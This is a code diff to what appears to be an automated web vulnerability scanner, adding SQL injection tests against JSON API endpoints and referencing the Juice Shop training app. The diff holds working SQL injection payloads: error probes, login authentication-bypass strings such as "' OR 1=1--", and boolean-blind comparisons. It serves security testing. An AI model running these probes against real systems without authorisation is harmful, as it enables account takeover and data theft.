@@ -180,6 +180,120 @@
           else:
               print(f"    [{param_name}] No SQLi detected")
 
+  # ── Part C: JSON API SQLi (for SPAs — test all API endpoints with JSON payloads) ──
+  CONFIRMED_APIS = _G.get('CONFIRMED_APIS', [])
+  api_login_url  = _G.get('api_login_url', '')
+
+  # Build list of JSON API endpoints to test
+  json_api_targets = []
+  # 1. Add the login endpoint (classic Juice Shop SQLi target)
+  if api_login_url:
+      api_fields = _G.get('api_login_fields', {})
+      json_api_targets.append({
+          'url': api_login_url,
+          'fields': api_fields,
+          'desc': 'API login endpoint',
+      })
+  # 2. Add confirmed APIs that accept input (search, etc.)
+  for api in CONFIRMED_APIS:
+      url = api['url']
+      if any(kw in url.lower() for kw in ['search', 'query', 'find', 'lookup', 'filter']):
+          json_api_targets.append({
+              'url': url,
+              'fields': {'q': 'test'},
+              'desc': 'Search/query endpoint',
+          })
+  # 3. Try common parameterized API paths from ALL_LINKS
+  for link in ALL_LINKS:
+      if '?' in link and ('/rest/' in link or '/api/' in link):
+          from urllib.parse import urlparse as _up, parse_qs as _pq
+          _parsed = _up(link)
+          _params = _pq(_parsed.query)
+          if _params:
+              json_api_targets.append({
+                  'url': link.split('?')[0],
+                  'fields': {k: v[0] for k, v in _params.items()},
+                  'desc': f'API with params: {list(_params.keys())}',
+              })
+
+  if json_api_targets:
+      print(f"\n[SQLi] Testing {len(json_api_targets)} JSON API endpoints")
+
+      for target in json_api_targets:
+          url    = target['url']
+          fields = target['fields']
+          desc   = target['desc']
+
+          print(f"\n  Testing JSON API: {url} ({desc})")
+
+          for field_name in fields:
+              time.sleep(0.3)
+
+              # Baseline: normal request
+              normal_payload = dict(fields)
+              try:
+                  r_base = session.post(url, json=normal_payload, timeout=8)
+              except Exception:
+                  continue
+
+              # Single quote error probe
+              err_payload = dict(fields)
+              err_payload[field_name] = "'"
+              try:
+                  r_err = session.post(url, json=err_payload, timeout=8)
+                  errors = sqli_error_found(r_err.text)
+                  if errors:
+                      print(f"    [CRITICAL] SQLi ERROR in JSON field '{field_name}' on {url}")
+                      print(f"    SQL errors: {errors}")
+                      print(f"    Evidence: {r_err.text[:400]}")
+                      sqli_findings.append({'field': field_name, 'url': url, 'method': 'post-json', 'type': 'error-based'})
+                      continue
+              except Exception:
+                  continue
+
+              # Auth bypass for login endpoints
+              if 'login' in url.lower() or 'auth' in url.lower():
+                  bypass_payload = dict(fields)
+                  for sqli_val in ["' OR '1'='1'--", "' OR 1=1--", "admin'--"]:
+                      bypass_payload[field_name] = sqli_val
+                      try:
+                          r_bypass = session.post(url, json=bypass_payload, timeout=8)
+                          if r_bypass.status_code == 200:
+                              try:
+                                  data = r_bypass.json()
+                                  data_str = str(data)
+                                  if 'token' in data_str.lower() or 'auth' in data_str.lower():
+                                      print(f"    [CRITICAL] SQLi AUTH BYPASS via JSON field '{field_name}' on {url}")
+                                      print(f"    Payload: {sqli_val}")
+                                      print(f"    Response: {data_str[:300]}")
+                                      sqli_findings.append({
+                                          'field': field_name, 'url': url,
+                                          'method': 'post-json', 'type': 'auth-bypass',
+                                          'evidence': data_str[:300],
+                                      })
+                                      break
+                              except Exception:
+                                  pass
+                      except Exception:
+                          continue
+
+              # Boolean blind for search/query endpoints
+              if 'search' in url.lower() or 'q' in fields:
+                  try:
+                      true_p = dict(fields)
+                      true_p[field_name] = "test' AND '1'='1"
+                      false_p = dict(fields)
+                      false_p[field_name] = "test' AND '1'='2"
+                      # Try as GET params for search endpoints
+                      r_true = session.get(url, params=true_p, timeout=8)
+                      r_false = session.get(url, params=false_p, timeout=8)
+                      diff = abs(len(r_true.text) - len(r_false.text))
+                      if diff > 200:
+                          print(f"    [HIGH] Boolean SQLi on JSON API ?{field_name}=: diff={diff}b")
+                          sqli_findings.append({'field': field_name, 'url': url, 'method': 'get', 'type': 'boolean-blind'})
+                  except Exception:
+                      pass
+
   print(f"\n=== SQLi SUMMARY: {len(sqli_findings)} injection points found ===")
   for f in sqli_findings:
       print(f"  [{f['type'].upper()}] {f['method'].upper()} {f['url']} — field: {f['field']}")
